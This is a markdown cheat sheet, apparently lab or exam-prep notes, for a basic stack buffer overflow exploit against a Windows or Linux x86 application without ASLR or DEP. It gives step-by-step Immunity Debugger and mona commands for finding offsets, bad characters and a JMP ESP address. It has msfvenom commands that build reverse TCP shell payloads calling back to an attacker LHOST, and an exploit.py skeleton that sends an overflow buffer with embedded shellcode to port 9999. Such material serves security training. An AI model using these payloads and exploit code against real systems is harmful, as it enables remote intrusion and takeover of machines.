# Very basic version (no ASLR no DEP)

<br>

__Immunity Debugger__ :  https://debugger.immunityinc.com/ID_register.py
<br>
__Mona__ : https://github.com/corelan/mona/archive/refs/heads/master.zip
<br>
<sub>mona directory has to be with all the the other python scripts</sub>
<br>
<br>
<br>
<br>
__Order to proceed__ :
<br>
```
INTRO - in Immunity : !mona config -set workingfolder c:\<choose>\%p

1 - Find how many bytes to crash the app
2 - Generate cycle chars => /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bytes2crash> 
                      or => msf-pattern_create -l <bytes2crash>
3 - Find EIP address
4 - Find offset => /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_address> -l <bytes2crash>
5 - Modify exploit.py
6 - Test previous result with "BBBB" to check if EIP take the good ASCII value (42424242 = BBBB)
7 - Generate badchars (CF badchars.py)
8 - Generate same but in Immunity : !mona bytarray -cpb "\x00"
9 - Copy the output of step 7 in exploit.py and send
10 - Immunity : !mona compare -f c:\<your_folder>\<your_app_name>\bytearray.bin -a <ESP_address>
11 - Remove badchars (1 by 1) resend & recheck until "unmodified" : !mona bytearray -cpb "\x00\x..\x.." and so on
12 - Once everything if ok, find esp jmp address : !mona jmp -r esp
     and write it in exploit.py (Little Endian)
```
![image](https://user-images.githubusercontent.com/97956863/201435014-512d7c22-d8c3-40d1-bef8-fb77a5bfaba7.png)

```
13 - Craft payload :
          msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -b "\x00\x...." -f py
                           /x64/
          msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x...." -f py          
14 - Copy output to exploit.py
15 - Send & Enjoy
```


## mona short CheatSheet

```
!mona config -set workingfolder c:\<folder>\%p
!mona bytearray -cpb "\x00"
!mona compare -f c:\<folder>\<app_name>\bytearray.bin
!mona jmp -r esp 
```

## msfvenom short CheatSheet

```
cycl    : /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bytes2crash> | or | msf-pattern_create -l <bytes2crash>
offset  : /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_address> -l <bytes2crash>
payload : msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -b "\x00\x...." -f py
                           /x64/
          msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x...." -f py 
```
<br>
<br>
<br>
<br>

## exploit.py

```
#!/usr/bin/env python2

import socket, sys

ip = sys.argv[1]

port = 9999

offset = ""
esp = "" #little endian here
nop = "\x90" * 20

buf =  b"" #crafted payload here 
buf += b"\xdb\xcd\xd9\x74\x24\xf4\xbb\x67\x65\x06\x7c\x5d"
buf += b"\x33\xc9\xb1\x12\x31\x5d\x17\x03\x5d\x17\x83\x8a"
buf += b"\x99\xe4\x89\x65\xb9\x1e\x92\xd6\x7e\xb2\x3f\xda"
buf += b"\x09\xd5\x70\xbc\xc4\x96\xe2\x19\x67\xa9\xc9\x19"
buf += b"\xce\xaf\x28\x71\xdb\x44\xcc\xe3\xb3\x58\xd2\xf2"
buf += b"\x1f\xd4\x33\x44\xf9\xb6\xe2\xf7\xb5\x34\x8c\x16"
buf += b"\x74\xba\xdc\xb0\xe9\x94\x93\x28\x9e\xc5\x7c\xca"
buf += b"\x37\x93\x60\x58\x9b\x2a\x87\xec\x10\xe0\xc8"

msg = "A" * offset
msg += esp
msg += nop
msg += buf


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try :

        s.connect((ip, port))
        print "[+] Connected.\nSending buffer...."
        s.send(bytes(msg + "\r\n"))
        print "Done."

except Exception as e :
        print e

```

## badchars.py

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```
